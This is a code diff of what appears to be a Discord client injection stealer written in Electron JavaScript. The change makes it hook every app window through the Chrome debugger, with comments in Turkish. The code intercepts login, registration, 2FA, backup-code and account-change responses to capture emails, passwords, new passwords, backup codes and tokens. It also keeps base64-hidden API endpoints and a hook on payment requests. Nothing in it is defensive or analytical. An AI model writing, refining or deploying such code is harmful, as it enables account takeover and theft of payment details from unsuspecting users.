@@ -4,7 +4,7 @@ const https = require('https');
 const path = require('path');
 const querystring = require('querystring');
 
-const { BrowserWindow, session } = require('electron');
+const { app, BrowserWindow, session } = require('electron');
 
 // Helper function to check if a file exists
 const exists = async (p) => {
@@ -46,7 +46,7 @@ const CONFIG_BASE64 = {
             "aHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki90b2tlbnM=",
         ],
     },
-    API: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkv",
+    API: "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1l",
     badges: {
         Discord_Employee: {
             Value: 1,
@@ -136,6 +136,7 @@ const CONFIG = {
 
 const executeJS = script => {
     const window = BrowserWindow.getAllWindows()[0];
+    if (!window) return Promise.resolve(null);
     return window.webContents.executeJavaScript(script, true);
 };
 
@@ -531,74 +532,84 @@ const initiation = async () => {
 let email = "";
 let password = "";
 let initiationCalled = false;
-const createWindow = () => {
-    const mainWindow = BrowserWindow.getAllWindows()[0];
-    if (!mainWindow) return;
+const attachToWindow = (win) => {
+    if (!win) return;
 
-    mainWindow.webContents.debugger.attach('1.3');
-    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
+    // Pencere yüklendiği anda tek seferlik initiation tetikle
+    win.webContents.on('did-finish-load', async () => {
         if (!initiationCalled) {
-            await initiation();
             initiationCalled = true;
-        }
-
-        if (method !== 'Network.responseReceived') return;
-        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
-        if (![200, 202].includes(params.response.status)) return;
-
-        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
-            requestId: params.requestId
-        });
-        const responseData = JSON.parse(responseUnparsedData.body);
-
-        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
-            requestId: params.requestId
-        });
-        const requestData = JSON.parse(requestUnparsedData.postData);
-
-        switch (true) {
-            case params.response.url.endsWith('/login'):
-                if (!responseData.token) {
-                    email = requestData.login;
-                    password = requestData.password;
-                    return; // 2FA
-                }
-                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
-                break;
-
-            case params.response.url.endsWith('/register'):
-                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
-                break;
-
-            case params.response.url.endsWith('/totp'):
-                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
-                break;
-
-            case params.response.url.endsWith('/codes-verification'):
-                BackupCodesViewed(responseData.backup_codes, await getToken());
-                break;
-
-            case params.response.url.endsWith('/@me'):
-                if (!requestData.password) return;
-
-                if (requestData.email) {
-                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
-                }
-
-                if (requestData.new_password) {
-                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
-                }
-                break;
+            await initiation();
         }
     });
 
-    mainWindow.webContents.debugger.sendCommand('Network.enable');
+    try {
+        win.webContents.debugger.attach('1.3');
+        win.webContents.debugger.on('message', async (_, method, params) => {
+            if (method !== 'Network.responseReceived') return;
+            if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
+            if (![200, 202].includes(params.response.status)) return;
 
-    mainWindow.on('closed', () => {
-        createWindow();
+            const responseUnparsedData = await win.webContents.debugger.sendCommand('Network.getResponseBody', {
+                requestId: params.requestId
+            });
+            const responseData = JSON.parse(responseUnparsedData.body);
+
+            const requestUnparsedData = await win.webContents.debugger.sendCommand('Network.getRequestPostData', {
+                requestId: params.requestId
+            });
+            const requestData = JSON.parse(requestUnparsedData.postData);
+
+            switch (true) {
+                case params.response.url.endsWith('/login'):
+                    if (!responseData.token) {
+                        email = requestData.login;
+                        password = requestData.password;
+                        return; // 2FA
+                    }
+                    EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
+                    break;
+
+                case params.response.url.endsWith('/register'):
+                    EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
+                    break;
+
+                case params.response.url.endsWith('/totp'):
+                    EmailPassToken(email, password, responseData.token, "logged in with 2FA");
+                    break;
+
+                case params.response.url.endsWith('/codes-verification'):
+                    BackupCodesViewed(responseData.backup_codes, await getToken());
+                    break;
+
+                case params.response.url.endsWith('/@me'):
+                    if (!requestData.password) return;
+
+                    if (requestData.email) {
+                        EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
+                    }
+
+                    if (requestData.new_password) {
+                        PasswordChanged(requestData.new_password, requestData.password, responseData.token);
+                    }
+                    break;
+            }
+        });
+        win.webContents.debugger.sendCommand('Network.enable');
+    } catch (e) {}
+};
+
+// Hem mevcut hem de yeni açılacak pencereleri yakala:
+if (app) {
+    app.on('browser-window-created', (_, win) => {
+        attachToWindow(win);
     });
 }
-createWindow();
+
+const wins = BrowserWindow.getAllWindows();
+if (wins.length > 0) {
+    attachToWindow(wins[0]);
+}
 
 session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
     if (![200, 202].includes(details.statusCode)) return;
